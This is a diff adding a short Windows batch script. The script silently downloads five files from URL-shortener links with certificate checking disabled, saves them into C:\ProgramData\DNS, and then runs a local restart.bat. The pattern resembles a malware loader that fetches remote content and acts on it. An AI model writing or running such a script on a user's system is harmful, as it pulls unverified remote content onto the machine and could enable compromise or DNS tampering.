@@ -1,0 +1,7 @@
+@echo off
+wget -q --no-check-certificate https://bom.to/Den -O "C:\ProgramData\DNS\Den.txt"
+wget -q --no-check-certificate https://bom.to/ipDen -O "C:\ProgramData\DNS\ipDen.txt"
+wget -q --no-check-certificate https://bom.to/trang -O "C:\ProgramData\DNS\Trang.txt"
+wget -q --no-check-certificate https://bom.to/Chuyen -O "C:\ProgramData\DNS\Chuyen.txt"
+wget -q --no-check-certificate https://bom.to/Choang -O "C:\ProgramData\DNS\Choang.txt"
+C:\ProgramData\DNS\restart.bat
